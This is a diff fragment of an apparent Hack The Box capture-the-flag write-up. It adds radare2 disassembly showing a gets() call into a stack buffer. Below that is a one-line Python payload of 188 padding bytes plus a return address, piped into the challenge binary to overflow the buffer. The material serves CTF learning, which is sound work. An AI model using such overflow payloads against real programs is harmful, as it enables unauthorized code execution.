@@ -143,6 +143,36 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [0x080492b1]> 
 ```
 
+```assembly
+[0x080492b1]> s sym.vuln
+[0x08049272]> pdf
+            ; CALL XREF from main @ 0x8049313
+┌ 63: sym.vuln ();
+│           ; var char *s @ ebp-0xb8
+│           ; var int32_t var_4h @ ebp-0x4
+│           0x08049272      55             push ebp
+│           0x08049273      89e5           mov ebp, esp
+│           0x08049275      53             push ebx
+│           0x08049276      81ecb4000000   sub esp, 0xb4
+│           0x0804927c      e89ffeffff     call sym.__x86.get_pc_thunk.bx
+│           0x08049281      81c37f2d0000   add ebx, 0x2d7f
+│           0x08049287      83ec0c         sub esp, 0xc
+│           0x0804928a      8d8548ffffff   lea eax, [s]
+│           0x08049290      50             push eax                    ; char *s
+│           0x08049291      e8aafdffff     call sym.imp.gets           ; char *gets(char *s)
+│           0x08049296      83c410         add esp, 0x10
+│           0x08049299      83ec0c         sub esp, 0xc
+│           0x0804929c      8d8548ffffff   lea eax, [s]
+│           0x080492a2      50             push eax                    ; const char *s
+│           0x080492a3      e8c8fdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x080492a8      83c410         add esp, 0x10
+│           0x080492ab      90             nop
+│           0x080492ac      8b5dfc         mov ebx, dword [var_4h]
+│           0x080492af      c9             leave
+└           0x080492b0      c3             ret
+[0x08049272]> 
+```
+
 ```python
 ~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*188 + '\xe2\x91\x04\x08')" | ./vuln     
 You know who are 0xDiablos: 
